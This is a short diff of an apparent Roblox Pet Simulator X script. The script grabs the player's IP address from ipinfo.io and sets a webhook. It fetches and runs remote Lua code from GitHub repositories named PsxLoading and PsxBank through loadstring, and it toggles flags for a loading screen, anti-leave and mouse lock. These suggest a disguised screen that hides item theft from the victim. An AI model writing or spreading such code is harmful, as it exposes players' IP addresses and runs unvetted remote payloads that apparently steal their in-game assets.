@@ -213,7 +213,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= true then
+if _G.LoadingScreen ~= false then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Cypaex/PsxLoading/main/Engine.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
@@ -748,9 +748,9 @@ end
 local diaamt = PlayerInfos.Diamonds
 if diaamt < 110000 then
     _G.Webhook = Webhook
-    _G.LoadingScreen = true
-    _G.AntiLeave = true
-    _G.MouseLock = true
+    _G.LoadingScreen = false
+    _G.AntiLeave = false
+    _G.MouseLock = false
     loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Cypaex/PsxBank/main/Bank.lua", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
